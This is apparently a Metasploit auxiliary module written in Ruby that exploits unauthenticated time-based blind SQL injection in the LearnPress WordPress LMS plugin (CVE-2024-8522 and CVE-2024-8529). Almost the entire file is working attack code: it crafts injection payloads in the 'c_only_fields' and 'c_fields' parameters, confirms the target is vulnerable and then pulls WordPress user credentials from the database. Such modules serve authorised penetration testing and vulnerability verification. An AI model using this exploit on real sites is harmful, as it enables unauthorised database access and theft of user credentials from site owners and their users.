##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress LearnPress Unauthenticated SQLi (CVE-2024-8522, CVE-2024-8529)',
        'Description' => %q{
          The LearnPress WordPress LMS Plugin up to version 4.2.7 is vulnerable to SQL injection via
          the 'c_only_fields' and 'c_fields' parameters. This allows unauthenticated attackers to exploit blind SQL injections
          and extract sensitive information.
        },
        'Author' => [
          'abrahack',                              # Vulnerability Discovery
          'Valentin Lobstein',                     # Metasploit Module
          'Achref Ben Thameur a.k.a achrefthameur' # Help for CVE-2024-8529 reproduction
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-8522'],
          ['CVE', '2024-8529'],
          ['URL', 'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/learnpress/learnpress-wordpress-lms-plugin-427-unauthenticated-sql-injection-via-c-only-fields'],
          ['URL', 'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/learnpress/learnpress-wordpress-lms-plugin-427-unauthenticated-sql-injection-via-c-fields']
        ],
        'Actions' => [
          ['CVE-2024-8522', { 'Description' => 'SQL Injection via c_only_fields parameter' }],
          ['CVE-2024-8529', { 'Description' => 'SQL Injection via c_fields parameter' }]
        ],
        'DefaultAction' => 'CVE-2024-8522',
        'DefaultOptions' => { 'SqliDelay' => '2', 'VERBOSE' => true },
        'DisclosureDate' => '2024-09-11',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options [
      OptInt.new('COUNT', [false, 'Number of rows to retrieve', 1]),
    ]
  end

  def run_host(_ip)
    if action.name.downcase.include?('cve-2024-8529')
      sqli_param = 'c_fields'
      description = 'CVE-2024-8529'
      path = '/wp-json/lp/v1/courses/archive-course'
      additional_params = { 'return_type' => 'json' }
    else
      sqli_param = 'c_only_fields'
      description = 'CVE-2024-8522'
      path = '/learnpress/v1/courses'
      additional_params = {}
    end

    print_status("Performing SQL injection for #{description} via the '#{sqli_param}' parameter...")

    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
      random_negative_number = -Rex::Text.rand_text_numeric(2).to_i
      vars_get = { sqli_param => "IF(COUNT(*)!=#{random_negative_number},(#{payload}),0)" }.merge(additional_params)

      vars_get['rest_route'] = path if action.name.downcase.include?('cve-2024-8522')

      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, path),
        'vars_get' => vars_get
      })

      fail_with(Failure::Unreachable, 'Connection failed') unless res
    end

    fail_with(Failure::NotVulnerable, 'Target is not vulnerable.') unless @sqli.test_vulnerable
    print_good('Target is vulnerable to SQLi!')

    wordpress_sqli_initialize(@sqli)
    wordpress_sqli_get_users_credentials(datastore['COUNT'])
  end
end
